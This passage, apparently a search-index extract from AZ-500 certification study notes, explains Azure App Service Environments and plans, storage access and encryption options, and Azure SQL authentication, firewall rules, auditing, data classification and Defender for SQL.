App Service plan instances.</li> <li>Single-tenant systems to satisfy internal compliance or security requirements.</li> <li>Network-isolated application hosting.</li> <li>Multi-tier applications.</li> </ul> <p>There are many networking features that enable apps in a multi-tenant App Service to reach network-isolated resources or become network-isolated themselves. These features are enabled at the application level. With an App Service Environment, no added configuration is required for the apps to be on a virtual network. The apps are deployed into a network-isolated environment that's already on a virtual network. If you really need a complete isolation story, you can also deploy your App Service Environment onto dedicated hardware.</p> <p>Dedicated environment. - An App Service Environment is a single-tenant deployment of Azure App Service that runs on your virtual network:</p> <ul> <li>Applications are hosted in App Service plans (which are a provisioning profile for an application host.)</li> <li>App Service plans  are created in an App Service Environment. </li> </ul> <p>Scaling out an App Service plan: you create more application hosts with all the apps in that App Service plan on each host. </p> <ul> <li>A single App Service Environment v3 can have up to 200 total App Service plan instances across all the App Service plans combined.</li> <li>A single App Service Isolated v2 (Iv2) plan can have up to 100 instances by itself.</li> <li>When you're deploying onto dedicated hardware (hosts), you're limited in scaling across all App Service plans to the number of cores in this type of environment. An App Service Environment that's deployed on dedicated hosts has 132 vCores available. I1v2 uses two vCores, I2v2 uses four vCores, and I3v2 uses eight vCores per instance.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#27-azure-app-service-plan","title":"2.7. Azure App Service plan","text":"<p>An app service always runs in an\u00a0App Service plan. In addition, Azure Functions also has the option of running in an App Service plan. An App Service plan defines a set of compute resources for a web app to run. These compute resources are analogous to the server farm in conventional web hosting. One or more apps can be configured to run on the same computing resources (or in the same App Service plan).</p> <p>Each App Service plan defines:</p> <ul> <li>Operating System (Windows, Linux)</li> <li>Region (West US, East US, etc.)</li> <li>Number of VM instances</li> <li>Size of VM instances (Small, Medium, Large)</li> <li>Pricing tier (Free, Shared, Basic, Standard, Premium, PremiumV2, PremiumV3, Isolated, IsolatedV2). This determines what App Service features you get and how much you pay for the plan. </li> </ul> <p>When you create an App Service plan in a certain region (for example, West Europe), a set of compute resources is created for that plan in that region. Whatever apps you put into this App Service plan run on these compute resources as defined by your App Service plan.</p> <p>The pricing tiers available to your App Service plan depend on the operating system selected at creation time. There are a few categories of pricing tiers:</p> <ul> <li>Shared compute: Free and Shared, the two base tiers, runs an app on the same Azure VM as other App Service apps, including apps of other customers. These tiers allocate CPU quotas to each app that runs on the shared resources, and the resources cannot scale out.</li> <li>Dedicated compute: The Basic, Standard, Premium, PremiumV2, and PremiumV3 tiers run apps on dedicated Azure VMs. Only apps in the same App Service plan share the same compute resources. The higher the tier, the more VM instances are available to you for scale-out.</li> <li>Isolated: This Isolated and IsolatedV2 tiers run dedicated Azure VMs on dedicated Azure Virtual Networks. It provides network isolation on top of compute isolation to your apps. It provides the maximum scale-out capabilities.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#28-app-service-environment-networking","title":"2.8. App Service Environment networking","text":"<p>App Service Environment is a single-tenant deployment of Azure App Service that hosts Windows and Linux containers, web apps, API apps, logic apps, and function apps. When you install an App Service Environment, you pick the Azure virtual network that you want it to be deployed in. All of the inbound and outbound application traffic is inside the virtual network you specify. You deploy into a single subnet in your virtual network, and nothing else can be deployed into that subnet.</p> <p>Subnet requirements. - You must delegate the subnet to Microsoft.Web/hostingEnvironments, and the subnet must be empty. The size of the subnet can affect the scaling limits of the App Service plan instances within the App Service Environment. It's a good idea to use a /24 address space (256 addresses) for your subnet to ensure enough addresses to support production scale.</p> <p>Windows Containers uses an additional IP address per app for each App Service plan instance, and you need to size the subnet accordingly. If your App Service Environment has, for example, 2 Windows Container App Service plans, each with 25 instances and each with 5 apps running, you will need 300 IP addresses and additional addresses to support horizontal (up/down) scale.</p> <p>The minimal size of your subnet is a /27 address space (32 addresses). Any particular subnet has five addresses reserved for management purposes. In addition to the management addresses, App Service Environment dynamically scales the supporting infrastructure and uses between 4 and 27 addresses, depending on the configuration and load. You can use the remaining addresses for instances in the App Service plan.</p> <p>If you run out of addresses within your subnet, you can be restricted from scaling out your App Service plans in the App Service Environment. Another possibility is that you can experience increased latency during intensive traffic load if Microsoft can't scale the supporting infrastructure.</p> <p>App Service Environment has the following network information at creation:</p> Address type Description App Service Environment virtual network The virtual network deployed into. App Service Environment subnet The subnet deployed into. Domain suffix The domain suffix that is used by the apps made. Virtual IP (VIP) The VIP type is used. The two possible values are internal and external. Inbound address The inbound address is the address at which your apps are reached. If you have an internal VIP, it's an address in your App Service Environment subnet. If the address is external, it's a public-facing address. Default outbound addresses The apps use this address, by default, when making outbound calls to the internet. <p></p> <p>As you scale your App Service plans in your App Service Environment, you'll use more addresses from your subnet. Apps in the App Service Environment don't have dedicated addresses in the subnet. The specific addresses an app uses in the subnet will change over time.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#29-availability-zone-support-for-app-service-environments","title":"2.9. Availability Zone Support for App Service Environments","text":"<p>Azure App Service Environment can be deployed across\u00a0availability zones (AZ)\u00a0to help you achieve resiliency and reliability for your business-critical workloads. This architecture is also known as zone redundancy.</p> <p>When you configure it to be zone redundant, the platform automatically spreads the instances of the Azure App Service plan across three zones in the selected region. This means that the minimum App Service Plan instance count will always be three. If you specify a capacity larger than three, and the number of instances is divisible by three, the instances are spread evenly. Otherwise,\u00a0instance counts beyond 3*N\u00a0are spread across the remaining one or two zones.</p> <ul> <li>You configure availability zones when you create your App Service Environment.</li> <li>You can only specify availability zones when creating a new App Service Environment, not later.</li> <li>Availability zones are\u00a0only supported in a subset of regions.</li> </ul> <p>Since you can't convert pre-existing App Service Environments to use availability zones, migration will consist of a side-by-side deployment where you'll create a new App Service Environment with availability zones enabled. For more information on App Service Environment migration options, see App Service Environment migration.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#210-app-service-environment-certificates","title":"2.10. App Service Environment Certificates","text":"<p>Azure App Service\u00a0provides a highly scalable, self-patching web hosting service. Once the certificate is added to your App Service app or function app, you can secure a\u00a0custom Domain Name System (DNS)\u00a0name with it or use it in your application code.</p> <p>A certificate uploaded into an app is stored in a deployment unit that is bound to the app service plan's resource group and region combination (internally called a webspace). This makes the certificate accessible to other apps in the same resource group and region combination.</p> <p>The following lists are options for adding certificates in App Service:</p> <ul> <li>Create a free App Service managed certificate: A private certificate that's free of charge and easy to use if you just need to secure your custom domain in App Service.</li> <li>Purchase an App Service certificate: A private certificate that's managed by Azure. It combines the simplicity of automated certificate management and the flexibility of renewal and export options.</li> <li>Import a certificate from Key Vault: Useful if you use Azure Key Vault to manage your\u00a0Public-Key Cryptography Standards #12 (PKCS12)\u00a0certificates.</li> <li>Upload a private certificate: If you already have a private certificate from a third-party provider, you can upload it.</li> <li>Upload a public certificate: Public certificates are not used to secure custom domains, but you can load them into your code if you need them to access remote resources.</li> </ul> <p>**Prerequisites: **</p> <ul> <li>Create an App Service app.</li> <li>For a private certificate, make sure that it satisfies all requirements from App Service.</li> <li>Free certificate only:<ul> <li>Map the domain you want a certificate for to App Service.</li> <li>For a root domain (like contoso.com), make sure your app doesn't have any IP restrictions configured. Both certificate creation and its periodic renewal for a root domain depends on your app being reachable from the internet.</li> </ul> </li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#3-storage-security","title":"3. Storage Security","text":"","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#31-data-sovereignty","title":"3.1. Data sovereignty","text":"<p>Data sovereignty is the concept that information, which has been converted and stored in binary digital form, is subject to the laws of the country or region in which it is located. We recommend that you configure business continuity and disaster recovery (BCDR) across regional pairs to benefit from Azure\u2019s isolation and VM policies.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#32-configure-azure-storage-access","title":"3.2. Configure Azure storage access","text":"<p>Options for authorizing requests to Azure Storage include:</p> <ul> <li>Microsoft Entra ID\u00a0- Azure Storage provides integration with Microsoft Entra ID for identity-based authorization of requests to the Blob and Queue services.  When you use Microsoft Entra ID to authorize requests make from your applications, you avoid having to store your account access key with your code, as you do with Shared Key authorization. While you can continue to use Shared Key authorization with your blob and queue applications, Microsoft recommends moving to Microsoft Entra ID where possible.</li> <li>Microsoft Entra Domain Services authorization\u00a0for Azure Files. Azure Files supports identity-based authorization over Server Message Block (SMB) through Microsoft Entra Domain Services. You can use RBAC for fine-grained control over a client's access to Azure Files resources in a storage account</li> <li>Shared Key\u00a0- Shared Key authorization relies on your account access keys and other parameters to produce an encrypted signature string that is passed on via the request in the Authorization header.</li> <li>Shared Access Signatures\u00a0- A shared access signature (SAS) is a URI that grants restricted access rights to Azure Storage resources. You can provide a shared access signature to clients who should not be trusted with your storage account key but to whom you wish to delegate access to certain storage account resources. By distributing a shared access signature URI to these clients, you can grant them access to a resource for a specified period of time, with a specified set of permissions. The URI query parameters comprising the SAS token incorporate all of the information necessary to grant controlled access to a storage resource. A client who is in possession of the SAS can make a request against Azure Storage with just the SAS URI, and the information contained in the SAS token is used to authorize the request.</li> <li>Anonymous access to containers and blobs\u00a0- You can enable anonymous, public read access to a container and its blobs in Azure Blob storage. By doing so, you can grant read-only access to these resources without sharing your account key, and without requiring a shared access signature (SAS). </li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#33-deploy-shared-access-signatures","title":"3.3. Deploy shared access signatures","text":"<p>As a best practice, you shouldn't share storage account keys with external third-party applications. For untrusted clients, use a\u00a0shared access signature\u00a0(SAS). </p> <p>A shared access signature is a string that contains a security token that can be attached to a URI. Use a shared access signature to delegate access to storage objects and specify constraints, such as the permissions and the time range of access.</p> <p>-\u00a0Service-level\u00a0shared access signature allows access to specific resources in a storage account. You'd use this type of shared access signature, for example, to allow an app to retrieve a list of files in a file system or to download a file. It  is used to delegate access to a resource in either Blob storage, Queue storage, Table storage, or Azure Files. - Account-level\u00a0shared access signature allows access to anything that a service-level shared access signature can allow, plus additional resources and abilities. For example, you can use an account-level shared access signature to allow the ability to create file systems. - User delegation SAS, introduced with version 2018-11-09, is secured with Microsoft Entra credentials. This type of SAS is supported for the Blob service only and can be used to grant access to containers and blobs.</p> <p>One would typically use a shared access signature for a service where users read and write their data to your storage account. Accounts that store user data have two typical designs:</p> <ul> <li> <p>Clients upload and download data through a front-end proxy service, which performs authentication. This front-end proxy service has the advantage of allowing validation of business rules. But if the service must handle large amounts of data or high-volume transactions, you might find it complicated or expensive to scale this service to match demand.</p> <p></p> </li> <li> <p>A lightweight service authenticates the client as needed. Then it generates a shared access signature. After receiving the shared access signature, the client can access storage account resources directly. The shared access signature defines the client's permissions and access interval. The shared access signature reduces the need to route all data through the front-end proxy service.</p> <p></p> </li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#34-manage-microsoft-entra-storage-authentication","title":"3.4. Manage Microsoft Entra storage authentication","text":"<p>Azure Storage provides integration with Microsoft Entra ID for identity-based authorization of requests to the Blob and Queue services. With Microsoft Entra ID, you can use Azure role-based access control (Azure RBAC) to grant permissions to a security principal, which may be a user, group, or application service principal. The security principal is authenticated by Microsoft Entra ID to return an OAuth 2.0 token. The token can then be used to authorize a request against the Blob service.</p> <p>Authorization with Microsoft Entra ID is available for all general-purpose and Blob storage accounts in all public regions and national clouds. Only storage accounts created with the Azure Resource Manager deployment model support Microsoft Entra authorization. Blob storage additionally supports creating shared access signatures (SAS) that is signed with Microsoft Entra credentials.</p> <p>When a security principal (a user, group, or application) attempts to access a queue resource, the request must be authorized. With Microsoft Entra ID, access to a resource is a two-step process. First, the security principal's identity is authenticated, and an OAuth 2.0 token is returned. Next, the token is passed as part of a request to the Queue service and used by the service to authorize access to the specified resource. The authentication step requires that an application request an OAuth 2.0 access token at runtime. If an application is running from within an Azure entity, such as an Azure VM, a Virtual Machine Scale Set, or an Azure Functions app, it can use a managed identity to access queues.</p> <p>The authorization step requires one or more Azure roles to be assigned to the security principal. Native and web applications that request the Azure Queue service can also authorize access with Microsoft Entra ID.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#35-implement-storage-service-encryption","title":"3.5. Implement storage service encryption","text":"<ul> <li>All data (including metadata) written to Azure Storage is automatically encrypted using Storage Service Encryption (SSE).</li> <li>Microsoft Entra ID and Role-Based Access Control (RBAC) are supported for Azure Storage for both resource management operations and data operations, as follows:<ul> <li>You can assign RBAC roles scoped to the storage account to security principals and use Microsoft Entra ID to authorize resource management operations such as key management.</li> <li>Microsoft Entra integration is supported for blob and queue data operations. You can assign RBAC roles scoped to a subscription, resource group, storage account, or an individual container or queue to a security principal or a managed identity for Azure resources.</li> </ul> </li> <li>Data can be secured in transit between an application and Azure by using Client-Side Encryption, HTTPS, or SMB 3.0.</li> <li>OS and data disks used by Azure virtual machines can be encrypted using Azure Disk Encryption.</li> <li>Delegated access to the data objects in Azure Storage can be granted using a shared access signature.</li> </ul> <p>Azure Storage Service Encryption (SSE) for data at rest. - </p> <ul> <li>When a new storage account is provisioned, Azure Storage Encryption is automatically enabled for it and it cannot be disabled. Storage accounts are encrypted regardless of their performance tier (standard or premium) or deployment model (Azure Resource Manager or classic). All Azure Storage redundancy options support encryption, and all copies of a storage account are encrypted. All Azure Storage resources are encrypted, including blobs, disks, files, queues, and tables. All object metadata is also encrypted.</li> <li>Data in Azure Storage is encrypted and decrypted transparently using 256-bit AES encryption, one of the strongest block ciphers available, and is FIPS 140-2 compliant. </li> <li>Azure Storage encryption is similar to BitLocker encryption on Windows.</li> <li>Encryption does not affect Azure Storage performance. There is no additional cost for Azure Storage encryption.</li> </ul> <p>Encryption key management</p> <p>You can rely on Microsoft-managed keys for the encryption of your storage account, or you can manage encryption with your own keys. If you choose to manage encryption with your own keys, you have two options:</p> <ul> <li>You can specify a\u00a0customer-managed\u00a0key to use for encrypting and decrypting all data in the storage account. A customer-managed key is used to encrypt all data in all services in your storage account.</li> <li>You can specify a\u00a0customer-provided\u00a0key on Blob storage operations. A client making a read or write request against Blob storage can include an encryption key on the request for granular control over how blob data is encrypted and decrypted.</li> </ul> <p>The following table compares key management options for Azure Storage encryption.</p> Microsoft-managed keys Customer-managed keys Customer-provided keys Encryption/decryption operations Azure Azure Azure Azure Storage services supported All Blob storage, Azure Files Blob storage Key storage Microsoft key store Azure Key Vault Azure Key Vault or any other key store Key rotation responsibility Microsoft Customer Customer Key usage Microsoft Azure portal, Storage Resource Provider REST API, Azure Storage management libraries, PowerShell, CLI Azure Storage REST API (Blob storage), Azure Storage client libraries Key access Microsoft only Microsoft, Customer Customer only","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#36-configure-blob-data-retention-policies","title":"3.6. Configure blob data retention policies","text":"<p>*Immutable storage in Azure blob storage:</p> <p>Immutable storage for Azure Blob storage enables users to store business-critical data objects in a WORM (Write Once, Read Many) state. Immutable storage is available for general-purpose v2 and Blob storage accounts in all Azure regions.</p> <p>Time-based retention policy support: Users can set policies to store data for a specified interval. When a time-based retention policy is set, blobs can be created and read, but not modified or deleted. After the retention period has expired, blobs can be deleted but not overwritten. When a time-based retention policy is applied on a container, all blobs in the container will stay in the immutable state for the duration of the effective retention period. The effective retention period for blobs is equal to the difference between the blob's creation time and the user-specified retention interval. Because users can extend the retention interval, immutable storage uses the most recent value of the user-specified retention interval to calculate the effective retention period.</p> <p>Legal hold policy support: If the retention interval is not known, users can set legal holds to store immutable data until the legal hold is cleared. When a legal hold policy is set, blobs can be created and read, but not modified or deleted. Each legal hold is associated with a user-defined alphanumeric tag (such as a case ID, event name, etc.) that is used as an identifier string. Legal holds are temporary holds that can be used for legal investigation purposes or general protection policies. Each legal hold policy needs to be associated with one or more tags. Tags are used as a named identifier, such as a case ID or event, to categorize and describe the purpose of the hold.</p> <p>Support for all blob tiers: WORM policies are independent of the Azure Blob storage tier and apply to all the tiers: hot, cool, and archive. Users can transition data to the most cost-optimized tier for their workloads while maintaining data immutability.</p> <p>Container-level configuration: Users can configure time-based retention policies and legal hold tags at the container level. By using simple container-level settings, users can create and lock time-based retention policies, extend retention intervals, set and clear legal holds, and more. These policies apply to all the blobs in the container, both existing and new.</p> <p>Audit logging support: Each container includes a policy audit log. It shows up to seven time-based retention commands for locked time-based retention policies and contains the user ID, command type, time stamps, and retention interval. For legal holds, the log contains the user ID, command type, time stamps, and legal hold tags. This log is retained for the lifetime of the policy, in accordance with the SEC 17a-4(f) regulatory guidelines. The Azure Activity Log shows a more comprehensive log of all the control plane activities; while enabling Azure Resource Logs retains and shows data plane operations. It is the user's responsibility to store those logs persistently, as might be required for regulatory or other purposes.</p> <p>A container can have both a legal hold and a time-based retention policy at the same time. All blobs in that container stay in the immutable state until all legal holds are cleared, even if their effective retention period has expired. Conversely, a blob stays in an immutable state until the effective retention period expires, even though all legal holds have been cleared.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#37-storage-account-keys","title":"3.7. Storage Account Keys","text":"<p>Generated by Azure when creating the storage account. Azure generates 2 keys of 512-BITS. You use these keys to authorize access to data that resides in your storage account via Shared Key authorization. Azure KeyVault simplefies this process and allows your to perform the rotation of keys without  interrupting the applications.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#38-configure-azure-files-authentication","title":"3.8. Configure Azure files authentication","text":"<p>Azure Files supports identity-based authentication over Server Message Block (SMB) through on-premises Active Directory Domain Services (AD DS) and Microsoft Entra Domain Services (Microsoft Entra Domain Services).  With RBAC, the credentials you use for file access should be available or synced to Microsoft Entra ID.</p> <p>Azure Files enforces authorization on user access to both the share and the directory/file levels.</p> <p>At the directory/file level, Azure Files supports preserving, inheriting, and enforcing Windows DACLs just like any Windows file servers. You can choose to keep Windows DACLs when copying data over SMB between your existing file share and your Azure file shares. Whether you plan to enforce authorization or not, you can use Azure file shares to back up ACLs along with your data.</p> <p>Benefits of Identity-based authentication over using Shared Key authentication:</p> <ul> <li>Extend the traditional identity-based file share access experience to the cloud with on-premises AD DS and Microsoft Entra Domain Services.</li> <li>Enforce granular access control on Azure file shares.</li> <li>Back up Windows ACLs (also known as NTFS) along with your data. You can copy ACLs on a directory or file to Azure file shares using either Azure File Sync or common file movement toolsets. For example, you can use robocopy with the /copy:s flag to copy data as well as ACLs to an Azure file share. ACLs are preserved by default, you are not required to enable identity-based authentication on your storage account to preserve ACLs.</li> </ul> <p>How it works:</p> <p></p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#39-enable-the-secure-transfer-required-property","title":"3.9. Enable the secure transfer required property","text":"<p>You can configure your storage account to accept requests from secure connections only by setting the Secure transfer required property for the storage account. When you require secure transfer, any requests originating from an insecure connection are rejected. Microsoft recommends that you always require secure transfer for all of your storage accounts.</p> <p>Connecting to an Azure File share over SMB without encryption fails when secure transfer is required for the storage account. Examples of insecure connections include those made over SMB 2.1, SMB 3.0 without encryption, or some versions of the Linux SMB client. Azure Files connections require encryption (SMB)</p> <p>By default, the Secure transfer required property is enabled when you create a storage account. Azure Storage doesn't support HTTPS for\u00a0custom domain names, this option is not applied when you're using a custom domain name.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#4-sql-database-security","title":"4. SQL database security","text":"","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#41-sql-database-authentication","title":"4.1. SQL database authentication","text":"<p>A user is authenticated using one of the following two authentication methods:</p> <ul> <li>SQL authentication\u00a0- With this authentication method, the user submits a user account name and associated password to establish a connection. This password is stored in the master database for user accounts linked to a login or stored in the database containing the user accounts not linked to a login.</li> <li>Microsoft Entra authentication\u00a0- With this authentication method, the user submits a user account name and requests that the service use the credential information stored in Microsoft Entra ID.</li> </ul> <p>You can create user accounts in the master database, and grant permissions in all databases on the server, or you can create them in the database itself (called contained database users). By using contained databases, you obtain enhance portability and scalability.</p> <p>Logins and users: In Azure SQL, a user account in a database can be associated with a login that is stored in the master database or can be a user name that is stored in an individual database.</p> <ul> <li>A\u00a0login\u00a0is an individual account in the master database, to which a user account in one or more databases can be linked. With a login, the credential information for the user account is stored with the login.</li> <li>A\u00a0user account\u00a0is an individual account in any database that may be but does not have to be linked to a login. With a user account that is not linked to a login, the credential information is stored with the user account.</li> </ul> <p>Authorization\u00a0to access data and perform various actions are managed using database roles and explicit permissions. \u00a0Authorization is controlled by your user account's database role memberships and object-level permissions.</p> <p>Best practices: - you should grant users the least privileges necessary. - your application should use a dedicated account to authenticate. - Recommendation: to create a contained database user, which allows your app to authenticate directly to the database.</p> <p>Use Microsoft Entra authentication to centrally manage identities of database users and as an alternative to SQL Server authentication.</p> <p></p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#42-configure-sql-database-firewalls","title":"4.2. Configure SQL database firewalls","text":"<p>Azure SQL Database and Azure Synapse Analytics, previously SQL Data Warehouse, (both referred to as SQL Database in this lesson) provide a relational database service for Azure and other internet-based applications. </p> <p>Initially, all access to your Azure SQL Database is blocked by the SQL Database firewall.</p> <p>The firewall grants access to databases based  - on the originating IP address of each request. - on  virtual network rules based on virtual network service endpoints. Virtual network rules might be preferable to IP rules in some cases.</p> <p>Azure SQL Firewall  IP Rules:  - Server-level IP firewall rules allow clients to access the entire Azure SQL server, which includes all databases hosted in it. The master database holds these rules. You can configure a maximum of 128 server-level IP firewall rules for an Azure SQL server. You can configure server-level IP firewall rules using the Azure portal, PowerShell, or by using Transact-SQL statements. To create server-level IP firewall rules using the Azure portal or PowerShell, you must be the subscription owner or a subscription contributor. To create a server-level IP firewall rule using Transact-SQL, you must connect to the SQL Database instance as the server-level principal login or the Microsoft Entra administrator (which means that a server-level IP firewall rule must have first been created by a user with Azure-level permissions). - Database-level IP firewall rules are used to allow access to specific databases on a SQL Database server. You can create them for each database, included the master database. Also, there is a maximum of 128 rules. ou can only create and manage database-level IP firewall rules for master databases and user databases by using Transact-SQL statements, and only after you have configured the first server-level firewall.</p> <p>Azure Synapse Analytics only supports server-level IP firewall rules, and not database-level IP firewall rules.</p> <p>Data-level Firewall rules get evaluated first:</p> <p></p> <p>To allow applications from Azure to connect to your Azure SQL Database, Azure connections must be enabled. When an application from Azure attempts to connect to your database server, the firewall verifies that Azure connections are allowed. A firewall setting with starting and ending addresses equal to 0.0.0.0 indicates Azure connections are allowed. This option configures the firewall to allow all connections from Azure including connections from the subscriptions of other customers. When selecting this option, make sure your sign-in and user permissions limit access to authorized users only.</p> <p>Whenever possible, as a best practice, use database-level IP firewall rules to enhance security and to make your database more portable. Use server-level IP firewall rules for administrators and when you have several databases with the same access requirements, and you don't want to spend time configuring each database individually.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#43-enable-and-monitor-database-auditing","title":"4.3. Enable and monitor database auditing","text":"<p>Auditing for Azure SQL Database and Azure Synapse Analytics tracks database events and writes them to an audit log in your Azure storage account, Log Analytics workspace or Event Hubs.</p> <p>Auditing also:</p> <ul> <li>Helps you maintain regulatory compliance, understand database activity, and gain insight into discrepancies and anomalies that could indicate business concerns or suspected security violations.</li> <li>Enables and facilitates adherence to compliance standards, although it\u00a0doesn't guarantee compliance.</li> </ul> <p>You can use SQL database auditing to:</p> <ul> <li>Retain\u00a0an audit trail of selected events. You can define categories of database actions to be audited.</li> <li>Report\u00a0on database activity. You can use pre-configured reports and a dashboard to get started quickly with activity and event reporting.</li> <li>Analyze\u00a0reports. You can find suspicious events, unusual activity, and trends.</li> </ul> <p>In auditing, server-level auditing policies take precedence over database-label auditing policies. This means that:  </p> <ul> <li>A server policy applies to all existing and newly created databases on the server.</li> <li>If server auditing is enabled, it always applies to the database. The database will be audited, regardless of the database auditing settings.</li> <li>Enabling auditing on the database or data warehouse, in addition to enabling it on the server, does not override or change any of the settings of the server auditing. Both audits will exist side by side. In other words, the database is audited twice in parallel; once by the server policy and once by the database policy.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#44-implement-data-discovery-and-classification","title":"4.4. Implement data discovery and classification","text":"<p>Data discovery and classification provides advanced capabilities built into Azure SQL Database for discovering, classifying, labeling and protecting sensitive data (such as business, personal data, and financial information) in your databases. Discovering and classifying this data can play a pivotal role in your organizational information protection stature. It can serve as infrastructure for:</p> <ul> <li>Helping meet data privacy standards and regulatory compliance requirements.</li> <li>Addressing various security scenarios such as monitoring, auditing, and alerting on anomalous access to sensitive data.</li> <li>Controlling access to and hardening the security of databases containing highly sensitive data.</li> </ul> <p>Data exists in one of three basic states: at\u00a0rest, in\u00a0process, and in\u00a0transit. All three states require unique technical solutions for data classification, but the applied principles of data classification should be the same for each. Data that is classified as confidential needs to stay confidential when at rest, in process, or in transit.</p> <p>Data can also be either\u00a0structured\u00a0or\u00a0unstructured. Typical classification processes for structured data found in databases and spreadsheets are less complex and time-consuming to manage than those for unstructured data such as documents, source code, and email. Generally, organizations will have more unstructured data than structured data.</p> <p>Protect data at rest</p> Best practice Solution Apply disk encryption to help safeguard your data. Use Microsoft Azure Disk Encryption, which enables IT administrators to encrypt both Windows infrastructure as a service (IaaS) and Linux IaaS virtual machine (VM) disks. Disk encryption combines the industry-standard BitLocker feature and the Linux DM-Crypt feature to provide volume encryption for the operating system (OS) and the data disks. \u200eAzure Storage and Azure SQL Database encrypt data at rest by default, and many services offer encryption as an option. You can use Azure Key Vault to maintain control of keys that access and encrypt your data. Use encryption to help mitigate risks related to unauthorized data access. Encrypt your drives before you write sensitive data to them. <p>Protect data in transit</p> <p>We generally recommend that you always use SSL/TLS protocols to exchange data across different locations. . In some circumstances, you might want to isolate the entire communication channel between your on-premises and cloud infrastructures by using a VPN. For data moving between your on-premises infrastructure and Azure, consider appropriate safeguards such as HTTPS or VPN. When sending encrypted traffic between an Azure virtual network and an on-premises location over the public internet, use Azure VPN Gateway.</p> Best practice Solution Secure access from multiple workstations located on-premises to an Azure virtual network Use site-to-site VPN. Secure access from an individual workstation located on-premises to an Azure virtual network Use point-to-site VPN. Move larger data sets over a dedicated high-speed wide area network (WAN) link Use Azure ExpressRoute. If you choose to use ExpressRoute, you can also encrypt the data at the application level by using SSL/TLS or other protocols for added protection. Interact with Azure Storage through the Azure portal All transactions occur via HTTPS. You can also use Storage REST API over HTTPS to interact with Azure Storage and Azure SQL Database. <p>Data discovery and classification is part of the Advanced Data Security offering, which is a unified package for advanced Microsoft SQL Server security capabilities. You access and manage data discovery and classification via the central SQL Advanced Data Security portal.</p> <ul> <li>Discovery and recommendations\u00a0- The classification engine scans your database and identifies columns containing potentially sensitive data. It then provides you with an easier way to review and apply the appropriate classification recommendations via the Azure portal.</li> <li>Labeling\u00a0- Sensitivity classification labels can be persistently tagged on columns using new classification metadata attributes introduced into the SQL Server Engine. This metadata can then be utilized for advanced sensitivity-based auditing and protection scenarios.</li> <li>Information Types\u00a0- These provide additional granularity into the type of data stored in the column.</li> <li>Query result set sensitivity\u00a0- The sensitivity of the query result set is calculated in real time for auditing purposes.</li> <li>Visibility\u00a0- You can view the database classification state in a detailed dashboard in the Azure portal. Additionally, you can download a report (in Microsoft Excel format) that you can use for compliance and auditing purposes, in addition to other needs.</li> </ul> <p>SQL data discovery and classification comes with a built-in set of sensitivity labels and information types, and discovery logic. You can now customize this taxonomy and define a set and ranking of classification constructs specifically for your environment. Definition and customization of your classification taxonomy takes place in one central location for your entire Azure Tenant. That location is in Microsoft Defender for Cloud, as part of your Security Policy. Only a user with administrative rights on the Tenant root management group can perform this task.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#45-microsoft-defender-for-sql","title":"4.5. Microsoft Defender for SQL","text":"<p>Applies to:\u00a0Azure SQL Database\u00a0|\u00a0Azure SQL Managed Instance\u00a0|\u00a0Azure Synapse Analytics</p> <p>Microsoft Defender for SQL includes functionality for surfacing and mitigating potential database vulnerabilities and detecting anomalous activities that could indicate a threat to your database. It provides a single go-to location for enabling and managing these capabilities.</p> <p>Microsoft Defender for SQL provides: </p> <ul> <li>Vulnerability Assessment is an easy-to-configure service that can discover, track, and help you remediate potential database vulnerabilities. It provides visibility into your security state, and it includes actionable steps to resolve security issues and enhance your database fortifications.</li> <li>Advanced Threat Protection detects anomalous activities indicating unusual and potentially harmful attempts to access or exploit your database. It continuously monitors your database for suspicious activities, and it provides immediate security alerts on potential vulnerabilities, Azure SQL injection attacks, and anomalous database access patterns. Advanced Threat Protection alerts provide details of suspicious activity and recommend action on how to investigate and mitigate the threat.</li> </ul> <p>Enabling or managing Microsoft Defender for SQL settings requires belonging to the SQL security manager role or one of the database or server admin roles.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#vulnerability-assessment-for-sql-server","title":"Vulnerability assessment for SQL Server","text":"<p>Applies to: Azure SQL Database\u00a0|\u00a0Azure SQL Managed Instance\u00a0|\u00a0Azure Synapse Analytics</p> <ul> <li>Vulnerability assessment is a scanning service built into Azure SQL Database.</li> <li>The service employs a knowledge base of rules that flag security vulnerabilities.</li> <li>These rules cover database-level issues and server-level security issues, like server firewall settings and server-level permissions. - Permission configurations. - Feature configurations. - Database settings</li> <li>The results of the scan include actionable steps to resolve each issue and provide customized remediation scripts where applicable.</li> <li>Vulnerability assessment is part of Microsoft Defender for Azure SQL, which is a unified package for advanced SQL security capabilities. Vulnerability assessment can be 